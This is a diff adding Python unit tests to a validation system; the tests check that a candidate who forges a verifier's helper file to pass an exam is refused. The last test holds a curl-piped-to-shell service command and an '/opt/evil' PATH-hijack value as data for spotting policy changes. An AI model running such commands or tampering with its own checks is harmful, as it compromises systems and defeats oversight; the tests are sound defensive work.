@@ -31,7 +31,7 @@ from worldline.transaction import CollapseTransaction
 from worldline.validation import differences, requirement_hash
 
 from freshness_support import (
-    EXAM_CHECK, EXAM_V1, EXAM_V2, EXTRA_CHECK, P0, P0_PROTECTED, P1, SLOW_EXAM, FreshnessLab, isolated_paths, policy, synthetic_candidate, tree_bytes,
+    EXAM_CHECK, EXAM_IMPORTING, EXAM_V1, EXAM_V2, EXTRA_CHECK, HELPER_V1, P0, P0_PROTECTED, P1, SLOW_EXAM, FreshnessLab, isolated_paths, policy, synthetic_candidate, tree_bytes,
 )
 from validation_support import attach_fresh_context
 
@@ -663,3 +663,110 @@ class J_LegacyCompatibility(unittest.TestCase):
 
 if __name__ == "__main__":
     unittest.main()
+
+
+class K_VerifierDependencies(unittest.TestCase):
+    """Review finding R1 (JANUS II): a verifier's helpers are as authoritative as the file the
+    check names. Default scope: the named file's directory; explicit scope: `verifiers` globs;
+    documented limit: a top-level verifier without a declaration binds only itself (warned)."""
+
+    def test_forged_helper_beside_the_exam_is_refused_by_default(self) -> None:
+        lab = FreshnessLab(self, exam=EXAM_IMPORTING, files={"evaluator/helper.py": HELPER_V1})
+        try:
+            lab.init()
+            doctor = lab.client.request("doctor", {})["policy"]
+            self.assertEqual(doctor["warnings"], [])
+            self.assertTrue(any("evaluator/helper.py (directory)" in v for v in doctor["verifiers"]), doctor["verifiers"])
+            self.assertEqual(lab.fork("honest")["state"], "VALID")
+            self.assertTrue(lab.validation("honest")["fresh"])
+            world = lab.fork("cheat", "helper_forger")
+            self.assertEqual(world["state"], "VALID")  # the forged helper passed inside the world
+            status = lab.validation("cheat")
+            self.assertFalse(status["fresh"])
+            self.assertIn("evaluator/helper.py", " ".join(status["effective"]["verifiersModifiedByCandidate"]))
+            prime_before = lab.prime()
+            before, receipts = lab.live(), len(lab.receipts())
+            error = lab.refusal(lab.prepare, "cheat")
+            self.assertEqual(error.code, "VERIFIER_MODIFIED_BY_CANDIDATE")
+            _unchanged(self, lab, before, prime_before, receipts)
+            self.assertEqual(lab.prepare("honest")["decision"], "AUTHORIZED")
+        finally:
+            lab.close()
+
+    def test_declared_verifiers_bind_exactly_what_is_declared(self) -> None:
+        declared = policy({**EXAM_CHECK, "verifiers": ["evaluator/*"]})
+        lab = FreshnessLab(self, policy_value=declared, exam=EXAM_IMPORTING, files={"evaluator/helper.py": HELPER_V1})
+        try:
+            lab.init()
+            doctor = lab.client.request("doctor", {})["policy"]
+            self.assertTrue(any("evaluator/helper.py (declared)" in v for v in doctor["verifiers"]), doctor["verifiers"])
+            self.assertEqual(lab.fork("cheat", "helper_forger")["state"], "VALID")
+            self.assertEqual(lab.refusal(lab.prepare, "cheat").code, "VERIFIER_MODIFIED_BY_CANDIDATE")
+        finally:
+            lab.close()
+
+    def test_top_level_verifier_without_declaration_is_a_warned_limit_and_declaring_closes_it(self) -> None:
+        top_level = policy({**EXAM_CHECK, "argv": ["/usr/bin/python3", "exam.py"], "covers": ["candidate.txt"]})
+        lab = FreshnessLab(self, policy_value=top_level, files={"exam.py": EXAM_IMPORTING, "helper.py": HELPER_V1})
+        try:
+            lab.init()
+            doctor = lab.client.request("doctor", {})["policy"]
+            self.assertTrue(any("only the named top-level verifier exam.py is bound" in w for w in doctor["warnings"]), doctor)
+            self.assertFalse(any("helper.py" in v for v in doctor["verifiers"]))
+            self.assertEqual(lab.fork("cheat", "helper_forger")["state"], "VALID")
+            # Documented limit: with the default scope the forged sibling is not bound.
+            self.assertTrue(lab.validation("cheat")["fresh"])
+            # The remedy: declare the verifier set. The policy edit stales the old evidence, and a
+            # new cheat under the declared policy is refused by name.
+            lab.set_policy(policy({**EXAM_CHECK, "argv": ["/usr/bin/python3", "exam.py"], "covers": ["candidate.txt"], "verifiers": ["exam.py", "helper.py"]}))
+            lab.settle()
+            self.assertEqual(lab.client.request("doctor", {})["policy"]["warnings"], [])
+            self.assertEqual(lab.refusal(lab.prepare, "cheat").code, "EVIDENCE_STALE")
+            self.assertEqual(lab.fork("cheat2", "helper_forger")["state"], "VALID")
+            self.assertEqual(lab.refusal(lab.prepare, "cheat2").code, "VERIFIER_MODIFIED_BY_CANDIDATE")
+        finally:
+            lab.close()
+
+    def test_covered_argv_operand_is_warned_and_a_covered_declared_verifier_is_refused(self) -> None:
+        # An argv path under the check's own covers is candidate data (e.g. `test -f out.txt`):
+        # not silently an examiner, not silently dropped either — named in the warnings.
+        lab = FreshnessLab(self, policy_value=policy({**EXAM_CHECK, "covers": ["evaluator/*", "candidate.txt"]}))
+        try:
+            lab.init()
+            doctor = lab.client.request("doctor", {})["policy"]
+            self.assertTrue(any("evaluator/exam.py" in w and "candidate-owned data" in w for w in doctor["warnings"]), doctor)
+            self.assertEqual([v for v in doctor["verifiers"] if "exam.py" in v], [])
+            # A declared verifier inside covers is a contradiction: refused when the policy loads.
+            lab.set_policy(policy({**EXAM_CHECK, "covers": ["evaluator/*"], "verifiers": ["evaluator/*"]}))
+            lab.settle()
+            error = lab.refusal(lab.fork, "alpha")
+            self.assertEqual(error.code, "INVALID_PROJECT_CONFIG")
+            self.assertIn("cannot be candidate-owned", error.message)
+        finally:
+            lab.close()
+
+    def test_service_definition_and_check_environment_are_part_of_the_requirement(self) -> None:
+        from worldline.project import ProjectConfig, ServiceSpec
+        from worldline.validation import canonical_policy, differences
+        base = ProjectConfig(generated=(), checks=(), services=(ServiceSpec("web", ("/usr/bin/app", "--safe"), ".", {}, (), "no"),))
+        changed = ProjectConfig(generated=(), checks=(), services=(ServiceSpec("web", ("/usr/bin/curl", "http://x|sh"), ".", {}, (), "no"),))
+        self.assertNotEqual(canonical_policy(base), canonical_policy(changed))
+        a = {"policy": {"canonical": canonical_policy(base)}, "verifiers": [], "execution": {"checkEnvironment": {"PATH": "/usr/bin"}}}
+        b = {"policy": {"canonical": canonical_policy(changed)}, "verifiers": [], "execution": {"checkEnvironment": {"PATH": "/opt/evil:/usr/bin"}}}
+        report = differences(a, b)
+        self.assertTrue(any(d.startswith("service changed: web") for d in report), report)
+        self.assertIn("execution changed: checkEnvironment (PATH)", report)
+        lab = FreshnessLab(self)
+        try:
+            lab.init()
+            self.assertEqual(lab.fork("alpha")["state"], "VALID")
+            # A daemon restart with a different PATH changes what a check would resolve: stale.
+            lab.daemon_env["PATH"] = "/opt/janus2-nonexistent:" + lab.daemon_env["PATH"]
+            lab.restart()
+            error = lab.refusal(lab.prepare, "alpha")
+            self.assertEqual(error.code, "EVIDENCE_STALE")
+            self.assertIn("execution changed: checkEnvironment (PATH)", error.details["differences"])
+            self.assertEqual(lab.revalidate("alpha")["outcome"], "PASS")
+            self.assertEqual(lab.prepare("alpha")["decision"], "AUTHORIZED")
+        finally:
+            lab.close()
